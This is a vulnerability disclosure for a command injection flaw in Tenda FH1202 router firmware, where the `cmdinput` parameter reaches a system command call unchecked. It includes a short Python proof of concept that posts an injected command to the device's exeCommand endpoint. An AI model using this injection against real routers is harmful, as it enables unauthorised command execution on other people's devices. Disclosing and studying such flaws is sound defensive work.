## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2079.html

## Affected version

FH1202 V1.2.0.14(408)

## Vulnerability details

In the Tenda FH1202 V1.2.0.14(408) firmware, we discovered a command injection vulnerablility in `formexeCommand` function in the `cmdinput` parameter and the `str` varable is assigned to `cmd_buf` variable, which is directly used in `doSystemCmd` function, causing an arbitrary command execution. The user-provided `cmdinput` can trigger this security vulnerability.

![image-20240407163859236](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240407163859236.png)

![image-20240407163914599](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240407163914599.png)

## POC

```python
import requests
IP = "192.168.84.102"
url = f"http://{IP}/goform/exeCommand"
data = "cmdinput=ls;"
ret = requests.post(url=url,data=data)
```

![image-20240407162830240](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240407162830240.png)
